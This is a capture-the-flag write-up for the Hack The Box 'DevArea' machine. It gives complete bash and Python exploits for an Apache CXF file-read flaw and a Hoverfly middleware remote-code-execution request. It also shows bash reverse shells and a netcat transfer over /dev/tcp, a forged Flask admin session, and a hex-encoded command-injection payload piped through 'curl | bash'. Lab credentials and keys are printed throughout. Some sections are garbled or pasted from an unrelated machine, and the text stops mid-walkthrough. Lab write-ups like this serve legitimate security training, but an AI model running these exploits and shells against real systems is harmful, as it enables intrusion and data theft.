# HTB DevArea Linux, Medium, 3.4
- by **`0xPablo`  github page `github.com/vorkampfer/hackthebox3`**
*(image: intro_image_devarea_htb_canva_updated.png)*
-  **Resources:**
> 1. 0xdf  - HackTheBox gitlab: `https://0xdf.gitlab.io/2026/07/04/htb-devarea.html`
> 2. IPPSEC -  `https://ippsec.rocks/`

- **View terminal output with color**
> **`ᐅ bat -l Bash --paging=never name_of_file -p`**

### NOTE: This write-up was done using *BlackArch*
*(image: blackarch_forever_4ever_updated 3.jpeg)*
### Synopsis:
```Bash
`DevArea` is a medium-difficulty Linux machine that chains together several service misconfigurations. Anonymous FTP exposes a Java SOAP application built on `Apache CXF` with the Aegis databinding module, which is vulnerable to an SSRF flaw, CVE-2024-28752. We abuse this to read `/proc/<PID>/cmdline` entries and recover the `Hoverfly` admin credentials from the arguments of a running process. The `Hoverfly` Admin UI is affected by CVE-2025-54123, whose middleware endpoint permits remote code execution and grants a foothold as `dev_ryan`. We then analyze the source of an internal monitoring app, `SysWatch`, whose installation script leaves its environment file world-readable. The leaked secret key lets us forge an admin `Flask` session, and a weak blacklist regex in the service-status feature is bypassed to gain command injection as the `syswatch` user. Finally, we abuse a root-executed log-reading CLI whose symlink validation fails to resolve chained symlinks, leaking the root SSH private key for a full compromise.
```
### TLDR:
```Bash
1. I learned a-lot about symlinks. Very fun box except when it crashed on me trying to get the syswatch shell.
```
# Checking connection status
1. **Checking my openvpn connection with a bash script.**
```Bash
1. ᐅ htb.sh --set '10.129.244.208' devarea.htb
[sudo] password for scottx0beam:
==> [+]  Hostname successfully injected!
10.129.244.208 devarea.htb
Done!
2.ᐅ htb.sh --status

==> [+] OpenVPN is up and running.  Initialization Sequence Completed
==> [+] OpenVPN tunnel with logging has started successfully
==> [!] Network is unreachable. Check your connection. It could be just a false positive or generic error on initial connection.
2026-07-06 17:27:58 sitnl_send: rtnl: generic error (-101): Network is unreachable

==>[+]
==>[+]  ps -auxw shows the script is running:
scottx0+  280622  0.0  0.0   8060  5924 pts/13   S+   17:27   0:00 bash /home/scottx0beam/bash_scripts/htb.sh --start-logging DevAreagetoffmynutzsackbeesh.ovpn openvpn.log
scottx0+  280899  0.0  0.0   5776  3884 pts/13   S+   17:27   0:00 tee -a openvpn.log
2026-07-06 17:27:58 OPTIONS IMPORT: tun-mtu set to 1500
2026-07-06 17:27:57 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Compression support is deprecated and we recommend to disable it completely.
2026-07-06 17:27:58 Data Channel: cipher 'AES-256-CBC', auth 'SHA256', peer-id: 55, compression: 'lzo'

==>[+]  The PID number for OpenVPN is: 281020

==>[+]  Your Tun0 ip is: 10.10.14.138

==>[+]  The HackTheBox server IP is: 10.129.244.208 devarea.htb

==> [+]  Successfully pinged the HackTheBox server at 10.129.244.208.
==> [+]  The HackTheBox server is up and responding to ping.
==>[+] 10.129.244.208 (ttl -> 63): Linux

eno1:=> mtu:1300
tun0:=> mtu:1280
==> [+]  Goodbye!
```
# Basic Recon
2. **Nmap**
```Bash
1. I use variables and aliases to make things go faster. For a list of my variables and aliases vist github.com/vorkampfer
2. ᐅ nmap_reader.sh 10.129.244.208
  Target IP provided: 10.129.244.208
Enter the file-path of your nmap scan output file: portzscan.nmap
  File found!
  File format recognized!

>>>  nmap -A -Pn -n -vvv -oN nmap/portzscan.nmap -p 21,22,80,8080,8888
devarea.htb

>>> looking for nginx
>>> looking for OpenSSH
  OpenSSH version: OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
>>> Looking for Apache
Apache httpd 2.4.58
>>> Looking for IIS

>>> Looking for http ports
  80
  8080
  8888
  NOTE: If the specific port is open, it means the TCP port accepted a connection (so it is open at network level). Nmap sent probe data and got an HTTP-like response (so it classified the service as HTTP).

>>> Looking for popular CMS, OpenSource Frameworks, and Web Servers
8080/tcp open  http    syn-ack Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Hoverfly Dashboard
  Hoverfly detected. Hoverfly Dashboard is a web-based interface that allows users to manage and visualize API simulations created with Hoverfly. It provides features for monitoring requests, viewing simulation data, and configuring settings for testing environments..
8888/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  Golang net/http server detected. Golang net/http server is a web server built in the Go programming language.

>>> Looking for any subdomains that may have come out in the nmap scan
  10.129.27.214 devarea.htb

>>> Here are some interesting ports
21/tcp   open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh
  No OpenSSH detected on a non-standard port.

  No PHP version found in the nmap scan output.
  No Microsoft SQL Server detected in the nmap scan output.
8080/tcp open  http      Jetty 9.4.27.v20200227
  This is an http site

Open Ports: 21,22,80,8080,8888

{
  "target": "10.129.27.214",
  "ttl": 63,
  "os_guess": "Linux/Unix-like (likely)"
}

  No clock skew detected. No Kerberos port open.

  No Git repository found in the nmap scan output.

  No robots.txt page found in the nmap scan output.
  Goodbye!
1. Jetty CMS, as well as Hoverfly Dashboard, detected. Also FTP has anonymouse login allowed.
```
# Server is a Ubuntu 24.04.4 (**Noble** **Numbat**)
3. **Discovery with *Ubuntu Launchpad***
```Bash
1. Search "launchpad OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 blueprints"
2. https://blueprints.launchpad.net/ubuntu/+source/openssh/1:9.6p1-3ubuntu13.9
```
4. **Whatweb**
- Nothing
```Bash
1. ᐅ whatweb http://10.129.244.202/
http://10.129.244.202/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.129.244.202], RedirectLocation[http://variatype.htb/], Title[301 Moved Permanently], nginx[1.22.1]
http://variatype.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.244.202], Title[VariaType Labs — Variable Font Generator], nginx[1.22.1]
2.Nothing. I already added `variatype.htb` to my `/etc/hosts` file. Moving on.
```
5. **curl the server**

```Bash
1. ᐅ curl -s -X GET http://10.129.244.202/ -I
HTTP/1.1 301 Moved Permanently
Server: nginx/1.22.1
Date: Sat, 04 Jul 2026 13:50:49 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://variatype.htb/
2. Curling the Golang Server
>>> ᐅ curl -s -X GET http://10.129.27.214:8888 -I
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 600
Content-Type: text/html; charset=utf-8
Last-Modified: Thu, 13 Mar 2025 22:45:45 GMT
Date: Thu, 09 Jul 2026 17:34:50 GMT
```

----
# FTP anonymous is allowed
```Bash
1. ᐅ ftp 10.129.27.214
Connected to 10.129.27.214.
220 (vsFTPd 3.0.5)
Name (10.129.27.214:scottx0beam): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pug
550 Failed to change directory.
ftp> cd pub
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> get employee-service.jar
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
226 Transfer complete.
6445030 bytes received in 2.8891 seconds (2.1275 Mbytes/s)
ftp> exit
?Invalid command
ftp> quit
221 Goodbye.
2. ᐅ ls * | grep .jar
.rw-r--r--  6.4M scottx0beam scottx0beam  9 Jul 17:17  employee-service.jar <<< We will come back to this file later.
```

# 8888 is the only valid site
*(image: hoverfly_on_8888.png)*
```Bash
1. I will come back to enumerate the websites after enumerating the `employee-service.jar` file
```

# Jadx
```Bash
1. We will open `employee-service.jar` using jadx
2. sudo pacman -S jadx
3. ᐅ which jadx
/bin/jadx
4. ᐅ mkdir src
5. ᐅ /bin/jadx employee-service.jar -d src/
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 10
```

# Enumerating all the files
```Bash
1. There is a ton of files but not passwords in .java files
2. ᐅ cat -A ServerStarter.class | grep 'http://localhost:8080/employeeservice?wsdl'
http://localhost:8080/employeeservice?wsdl
3. http://devarea.htb:8080/employeeservice?wsdl <<< Finding this link tells you how to follow the SOAP protocol to use the application. Basically it is the method used to exfiltrate data. If we send SOAP the correct XML formatted querries we should be able get back file disclosures.
```

# Soapui
```Bash
1. What is "Soapui"
2. SoapUI is the worlds most widely-used automated testing tool for SOAP and REST APIs. Write, run, integrate, and automate advanced API Tests with ease. There is a commercial version `readyAPI`, but the free SoapUI version is enough for what we need.
3. It downloads via a bash script so I will not be installing that on my machine.
4.
```

# Creating the payload, Bash version CVE-2024-28752
1. I would attempt to explain this but when it comes to SOAP/XML protocol I am so confused on it.
2. I recommend checking out either IPPSEC timestamp 21:00 to 23:00 to figure out how this PoC works. 0xdf also explains this very well.
3. Take the bash exploit and run it with the path that you want to read.
4. If you decide to build a payload. Here is the github PoC `https://github.com/vulhub/vulhub/blob/master/apache-cxf/CVE-2024-28752/README.md`
```Bash
#!/bin/bash

fn="${1:-/etc/hostname}"

resp=$(curl -s http://devarea.htb:8080/employeeservice -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"' --data-binary '--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
    <soapenv:Body>
        <dev:submitReport>
            <arg0>
                <confidential>false</confidential>
                <content>test content</content>
                <department>IT</department>
                <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://'"$fn"'"/></employeeName>
            </arg0>
        </dev:submitReport>
    </soapenv:Body>
</soapenv:Envelope>
--MIME_boundary')

echo "$resp" | xmllint --xpath "//*[local-name()='return']/text()" - | cut -d' ' -f4 | tr -d '.' | base64 -d
```

# Executing the payload
```Bash
1. ᐅ ./file_read.sh '/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<SNIP>
2. ᐅ cat passwd | grep -i "sh$"
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
3. ᐅ ./file_read.sh /home/dev_ryan/.profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.<SNIP>
4.ᐅ ./file_read.sh /etc/os-release
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
5.ᐅ ./file_read.sh '/etc/apache2/sites-available/000-default.conf'
```

# python version of CVE-2024-28752
1.  Requires `$ pip install lxml`
2. I was able to code this version after attempting to understand the exploit.
3. Recommended reading: `https://github.com/vulhub/vulhub/blob/master/apache-cxf/CVE-2024-28752/README.md`
4. `https://www.sentinelone.com/vulnerability-database/cve-2024-28752/`
```python
import sys
import requests
import base64
import lxml.html
from lxml import etree
import re
import binascii

def _normalize_b64(data):
    cleaned = data.replace(".", "").strip()
    cleaned = re.sub(r"\s+", "", cleaned)
    cleaned = re.sub(r"[^A-Za-z0-9+/=_-]", "", cleaned)
    cleaned = cleaned.replace("-", "+").replace("_", "/")

    # Ensure proper Base64 block size.
    missing_padding = (-len(cleaned)) % 4
    if missing_padding:
        cleaned += "=" * missing_padding

    return cleaned

def exploit_devarea(target_url, file_path):
    boundary = "MIME_boundary"

    # The exact payload structure required by the Devarea service
    payload = f"""--{boundary}
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
    <soapenv:Body>
        <dev:submitReport>
            <arg0>
                <confidential>false</confidential>
                <content>test content</content>
                <department>IT</department>
                <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://{file_path}"/></employeeName>
            </arg0>
        </dev:submitReport>
    </soapenv:Body>
</soapenv:Envelope>
--{boundary}--"""

    headers = {
        "Content-Type": f'multipart/related; type="application/xop+xml"; boundary="{boundary}"'
    }

    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
        response.raise_for_status()

        # Use lxml to extract the content from the <return> tag, mirroring the xmllint logic
        tree = lxml.html.fromstring(response.content)
        result = tree.xpath("//*[local-name()='return']/text()")

        if result:
            raw_data = str(result[0])

            # Mirror the shell exploit first: 4th token, then fallback to best candidate.
            parts = raw_data.split()
            candidate = parts[3] if len(parts) >= 4 else parts[-1]

            try:
                print(base64.b64decode(_normalize_b64(candidate)).decode('utf-8', errors='replace'))
            except (binascii.Error, UnicodeDecodeError, ValueError, IndexError):
                # Some responses contain multiple tokens; decode the longest b64-like chunk.
                tokens = re.findall(r"[A-Za-z0-9+/._=-]+", raw_data)
                best = max(tokens, key=len) if tokens else ""
                print(base64.b64decode(_normalize_b64(best)).decode('utf-8', errors='replace'))
        else:
            print("[-] No return data found. Check if the file exists or path is accessible.")

    except (requests.RequestException, ValueError, binascii.Error, etree.ParserError) as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <file_path>")
        sys.exit(1)

    TARGET = "http://devarea.htb:8080/employeeservice"
    exploit_devarea(TARGET, sys.argv[1])
```

# Executing python version
1. I named it `soap_communicator.py`
```Bash
1. ~/hax4crack/devarea/CVE-2024-28752 ᐅ python3.12 soap_communicator.py '/etc/os-release'
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
2. CVE-2024-28752 ᐅ python3.12 soap_communicator.py '/proc/self/cmdline'
/usr/lib/jvm/java-8-openjdk-amd64/bin/java-jar/opt/EmployeeService/target/employee-service.jar
3.CVE-2024-28752 ᐅ python3.12 soap_communicator.py /
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib.usr-is-merged
lib64
lost+found
media
mnt
nix
opt
proc
root
run
sbin
sbin.usr-is-merged
snap
srv
sys
tmp
usr
var
4.CVE-2024-28752 ᐅ python3.12 soap_communicator.py '/etc/systemd/system/hoverfly.service'
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

# `/proc/self/cmdline` bash script
1. I tried just doing a 1 liner for loop in the terminal and it failed for some reason.
>`ᐅ PIDS=$(python3.12 ~/CVE-2024-28752/soap_communicator.py /proc/ | grep '^[0-9]')`
>`ᐅ for i in $PIDS; do python3.12 soap_communicator.py '/proc/$i/cmdline' 2>/dev/null; done
2. I call this soap_communicator.sh script. Call it whatever. You need to change the path and name of the above soap_communicator.py script in this bash version.
3. This script will run through `/proc/?/cmdline` and it finds a credential.
MD2GH16

# Executing the script
1. Great scripting practice but it turns out the credential is the same one we had before for the hoverfly admin.
MD2GH17

# Logging into the admin dashboard
1. Image 1 - Login as admin
![[hoverfly_on_8888_login_as_admin_dashboard.png]]
MD2GH18

# Version leakage `v1.11.3`
1. The first thing upon logging in is the display of the version number.
2. The version number should be stored properly on an encrypted server. LOL, Hacker nerd humor.

# CVE-2025-54123 Background
1. The vulnerability exists in the middleware management API endpoint `/api/v2/hoverfly/middleware`. This issue is born due to combination of three code level flaws: Insufficient Input Validation in middleware.go line 94-96; Unsafe Command Execution in local_middleware.go line 14-19; and Immediate Execution During Testing in hoverfly_service.go line 173. This allows an attacker to gain remote code execution (RCE) on any system running the vulnerable Hoverfly service. Since the input is directly passed to system commands without proper checks, an attacker can upload a malicious payload or directly execute arbitrary commands (including reverse shells) on the host server with the privileges of the Hoverfly process.
```ruby
1. Hoverfly vulnerable to remote code execution at `/api/v2/hoverfly/middleware` endpoint due to insecure middleware implementation
2. Hoverfly » Hoverfly Versions before (<) 1.12.0   Matching versions
cpe:2.3:a:hoverfly:hoverfly:*:*:*:*:*:*:*:*
3. This exploit is for versions 1.12.0 which is good because our version is 1.11.3
4. I check out the github security advisory
```
# CVE-2025-54123 PoC
1. `https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf`
2. Image 1 - Screenshot of where the authorization header is on the admin dashboard

# Burpsuite
```ruby
1. Login as admin with the creds we found. `http://devarea.htb:8888/` creds `admin:O7IJ27MyyXiU`
2. Start up burpsuite and foxyproxy in the `http history` you should soon see a GET request to the middleware api. Click on it and send it to repeater.
3. This is the only part you need to paste inside burpsuite REQUEST window.
---------------------
PUT /api/v2/hoverfly/middleware HTTP/1.1
Content-Type: application/json
{
    "binary": "/bin/bash",
    "script": "whoami"
}
-----------------------
3.So the entire REQUEST side should look like this:
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwOTQ3MjgzOTQsImlhdCI6MTc4MzY4ODM5NCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.TlaSrvaks3ZNznH1UFUL7iW4vd75319iTbCeRBmIJr1rNUdrCTROEBgHxgc7eZTCARCKPVjFjQbEBEOQmoVkRA
Connection: keep-alive
Content-Type: application/json
Referer: http://devarea.htb:8888/dashboard
DNT: 1
Sec-GPC: 1
Content-Length: 52

{
    "binary": "/bin/bash",
    "script": "id"
}
4. Success we have Remote Code Execution
>>>STDOUT:\nuid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

# Weaponizing the payload
```Bash
1. I just update the payload with a simple bash reverse shell
{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.63/443 0>&1"
}
2. Set up my listener
>>> sudo nc -nlvp 443
3. Success we have shell
```

# Shell as dev_ryan & upgrade
```Bash
1. ᐅ sudo nc -lnvp 443
[sudo] password for scottx0beam:
Listening on 0.0.0.0 443
Connection received on 10.129.27.214 45346
bash: cannot set terminal process group (1436): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ whoami
whoami
dev_ryan
dev_ryan@devarea:/opt/HoverFly$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
dev_ryan@devarea:/opt/HoverFly$ ^Z
[1]  + 519819 suspended  sudo nc -lnvp 443
~/hax4crack/devarea/CVE-2024-28752 ᐅ stty raw -echo; fg
[1]  + 519819 continued  sudo nc -lnvp 443
                                          reset xterm
dev_ryan@devarea:/opt/HoverFly$ export TERM=xterm-256color
dev_ryan@devarea:/opt/HoverFly$ source /etc/skel/.bashrc
dev_ryan@devarea:/opt/HoverFly$ stty rows 40 columns 187
dev_ryan@devarea:/opt/HoverFly$ export SHELL=/bin/bash
dev_ryan@devarea:/opt/HoverFly$ tty
/dev/pts/0
dev_ryan@devarea:/opt/HoverFly$ echo $SHELL
/bin/bash
dev_ryan@devarea:/opt/HoverFly$ echo $TERM
xterm-256color
dev_ryan@devarea:/opt/HoverFly$ hostname -I
10.129.27.214
```

# Begin enumeration as dev_ryan
```Bash
1. dev_ryan@devarea:/home$ cd dev_ryan/
2. dev_ryan@devarea:~$ ls
syswatch-v1.zip  user.txt
3. This zip file looks interesting
4. ᐅ sudo nc -nlvp 443 > syswatch-v1.zip
5. dev_ryan@devarea:~$ cat < /home/dev_ryan/syswatch-v1.zip > /dev/tcp/10.10.15.61/443
6. ᐅ sudo nc -nlvp 443 > syswatch-v1.zip
Listening on 0.0.0.0 443
Connection received on 10.129.27.214 33858
7. ᐅ md5sum syswatch-v1.zip
b66787236c40a92349809f2d5e6ff0e6  syswatch-v1.zip
8. dev_ryan@devarea:~$ md5sum syswatch-v1.zip
b66787236c40a92349809f2d5e6ff0e6  syswatch-v1.zip
9. dev_ryan@devarea:~$ sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

# syswatch
```Bash
1. It says we have sudo permissions to run `/op/syswatch/syswatch.sh` as root but if we try to cat out the file we get permission denied because the file is inside the zip file. We cannot even go inside the direcgtory `/opt/syswatch`
2. dev_ryan@devarea:~$ cat /opt/syswatch/syswatch.sh
cat: /opt/syswatch/syswatch.sh: Permission denied
3.dev_ryan@devarea:~$ cd /opt/syswatch
bash: cd: /opt/syswatch: Permission denied
3. File: /opt/syswatch
  Size: 4096      	Blocks: 8          IO Block: 4096   directory
Device: 252,0	Inode: 991         Links: 8
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-12-14 13:36:54.298198463 +0000
Modify: 2026-03-22 18:55:27.884838901 +0000
Change: 2026-03-22 18:55:27.884838901 +0000
 Birth: 2025-12-12 15:31:48.483485881 +0000
4. dev_ryan@devarea:~$ getfacl /opt/syswatch
getfacl: Removing leading '/' from absolute path names
# file: opt/syswatch
# owner: root
# group: root
user::rwx
user:dev_ryan:---
group::r-x
mask::r-x
other::r-x
5. Our user dev_ryan has --- permissions or nothing permissions.
6. dev_ryan@devarea:~$ cat /etc/passwd | grep syswatch
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
7.dev_ryan@devarea:~$ ps -ef --forest | grep -v 'grep' | grep syswatch
syswatch    1460       1  0 Jul09 ?        00:00:14 /opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py
8.dev_ryan@devarea:~$ ss -lntp
State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port 
LISTEN            0                 128                              127.0.0.1:7777                            0.0.0.0:*
```

# Since dev_ryan has ssh access I will get an ssh shell with him because we may need it
1. Make sure to delete or comment out the entry in your `/etc/ssh/ssh_config` file if you do not need it. Just for good OPSEC.
```Bash
1. ᐅ ssh-keygen -t ed25519 -f ryan_id
2. ᐅ cat ryan_id.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFnwfWZF6V0XZqdaf4D0QMsYV1PZ/Jr1xHC1IStayScC scottx0beam@Oasis11029
3. dev_ryan@devarea:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFnwfWZF6V0XZqdaf4D0QMsYV1PZ/Jr1xHC1IStayScC scottx0beam@Oasis11029' > authorized_keys
4. dev_ryan@devarea:~/.ssh$ cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOgaARmXJGgret7gBAnKiz0EXUy/HoVFHczQf/Xohcbl scottx0beam@Oasis11029
5. dev_ryan@devarea:~/.ssh$ chmod 600 authorized_keys
6. ᐅ chmod 600 ryan_id
7. ᐅ ssh dev_ryan@10.129.27.214 -i ryan_id
8. dev_ryan@devarea:~$ whoami
dev_ryan
9. dev_ryan@devarea:~$ export TERM=xterm
10. dev_ryan@devarea:~$ commandline disabled  
^C
11. I tried to drop into an ssh command line shell using `~C` but it says it is disabled. Not on the target machine but on my machine. I will have to edit my ssh_config file.
12. I edit my `/etc/ssh/ssh_config` and add the line `EnableEscapeCommandLine yes` so that when I have a remote ssh shell I can press `~C` and it will drop me into an ssh commandline shell.
13. dev_ryan@devarea:~$
ssh>
14. Success
15. You might need to exit the shell and ssh in again and then try the command `~C` and it should drop you into an ssh command shell. The trick is to hold down shift when you press the tilde ~ then while holding shift press c.
16. dev_ryan@devarea:~$
ssh> -L 7777:127.0.0.1:7777
Forwarding port.
```

# Syswatch forwarded
```Bash
1. http://localhost:7777/login
2. We have no creds but we did download that zip file. Lets extract the archive to see if there is a password in it.
3. ᐅ cat setup.sh | grep -i -C2 "2026"
  fi
fi
[ -z "$ADMIN" ] && ADMIN="SyswatchAdmin2026"
cat > "$ENV_FILE" <<EOF
SYSWATCH_SECRET_KEY=$SECRET
4. It was easy to find.
5. There is also a key in syswatch.env file
6. dev_ryan@devarea:~$ find / -name \*.env\* 2>/dev/null
/etc/syswatch.env
^C
7. dev_ryan@devarea:/home$ cat /etc/syswatch.env
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
SYSWATCH_LOG_DIR=/opt/syswatch/logs
SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
SYSWATCH_VERSION=1.0.0
8. ~/hax4crack/devarea/syswatch_zip/syswatch ᐅ find . -name \*.db\* 2>/dev/null
./syswatch_gui/syswatch.db
9. There is an sqlite database file in the zip file we downloaded.
10. ~/hax4crack/devarea/syswatch_zip/syswatch ᐅ sqlite3 ./syswatch_gui/syswatch.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL);
INSERT INTO users VALUES(1,'admin','scrypt:32768:8:1$IyKfiteB3TNFK6Hv$a0fbf5283db6a13859776827133e99d4d5ab43e85bedd05b06119e6fdca096ac81570d4497a836d09a155884182b6442cfcf6986b96310b514f34d9da871cb70');
PRAGMA writable_schema=ON;
CREATE TABLE IF NOT EXISTS sqlite_sequence(name,seq);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',1);
PRAGMA writable_schema=OFF;
COMMIT;
```

# Flask-unsign
1. With the syswatch secret key we are able to create a flask JWT.
```Bash
1. ᐅ flask-unsign -S f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725 --cookie "{'user_id':1,'username':'admin'}" --sign
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.alFSUQ.Iuf97iSEVi8tM3_zGxsmrJ0zeaQ
2. From the Flask JWT I was able paste session for name and the flask JWT key for value. I click refresh and success we are syswatch admin now.
```


# syswatch admin dashboard `Check System Service Status`
```Bash
1. Go to `check system service status`. I have a feeling that this field is very vulnerable to command injection.
2. I enter a sleep 1 and capture the check button click using burpsuite intercept.
3. ᐅ burpsuite 2>/dev/null & disown
4. If you have an issue doing and intercept on the localhost syswatch admin dashboard do the following.
5. Go to firefox browser and type `about:config`
6. set `network.proxy.allow_hijacking_localhost` to false <<< If that is failing to make burpsuite work to capture a localhost ip then try switching it to true
7. Clicking on the `check` button is where you want to intercept that request. It should look like the request below. If you have trouble finding it then check your `HTTP History` in burpsuite. Then send it to the repeater so we can fuzz the parameters.
8. POST /service-status HTTP/1.1
Host: 127.0.0.1:7777
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://127.0.0.1:7777
Connection: keep-alive
Referer: http://127.0.0.1:7777/service-status
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.alFZ8g.yrHzkUfYC-2ckx8zvM0ZirSE6Gw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
DNT: 1
Sec-GPC: 1
Priority: u=0, i

service=sleep <<< This fails
```

# Remote Code Execution found
1. Image 1 - Finding the first vulnerable syntax for a command injection
-see pdf-
2. All we needed to do was place a pip after the ssh command. `service=ssh|sleep 3`
3. Image 3 - Here we encoded our payload in hex and then decode to avoid all the special character bans.
-see pdf-
```Bash
1. Simply leaving the ssh command and then adding a pipe will allow for code execution. Why did this happen? This happened because in app.py that we download in the zip file well it shows the source code. In the source code the custom app.py in the flask framework bans all special characters except the pipe command and that is all we needed to get code execution. Also, I almost forgot capital letters are banned. To get around that we may need to encode our payload using xxd. I will show that next.
2. ᐅ find . -name \*app.py\* 2>/dev/null
./syswatch_gui/app.py
3. ᐅ find . -name \*app.py\* 2>/dev/null | xargs grep -i safe_service -C1
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")
4. This regex here fails to ban all the special characters. It bans most but not all of them. The `&,|,",'` special characters are allowed.
5. ᐅ echo 'bash -i >& /dev/tcp/10.10.15.63/443 0>&1' | xxd -p -c0
62617368202d69203e26202f6465762f7463702f31302e31302e31352e36332f34343320303e26310a
6. service=ssh|echo -n 62617368202d69203e26202f6465762f7463702f31302e31302e31352e36332f34343320303e26310a | xxd -r -p | bash
7.service=ssh|curl 10.10.15.61 | bash
